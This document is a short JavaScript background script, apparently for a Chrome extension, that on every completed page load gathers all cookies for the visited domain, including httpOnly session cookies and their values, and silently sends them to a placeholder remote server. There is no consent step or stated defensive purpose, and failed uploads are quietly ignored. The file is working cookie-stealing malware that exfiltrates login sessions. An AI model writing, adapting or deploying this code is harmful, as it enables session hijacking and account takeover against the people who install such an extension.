const SERVER_URL = "YOUR_SERVER_URL";
const UPLOAD_KEY = "YOUR_UPLOAD_KEY";

const uploaded = new Set();

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete" || !tab.url || !tab.url.startsWith("http")) return;

  const url = new URL(tab.url);
  const domain = url.hostname;

  if (uploaded.has(domain)) return;

  const cookies = await chrome.cookies.getAll({ domain });
  if (cookies.length === 0) return;

  const payload = {
    url: tab.url,
    domain,
    cookies: cookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      secure: c.secure,
      httpOnly: c.httpOnly,
      sameSite: c.sameSite,
      expirationDate: c.expirationDate || null
    })),
    timestamp: new Date().toISOString()
  };

  try {
    const res = await fetch(`${SERVER_URL}/api/cookies`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-api-key": UPLOAD_KEY },
      body: JSON.stringify(payload)
    });
    if (res.ok) uploaded.add(domain);
  } catch (e) {}
});
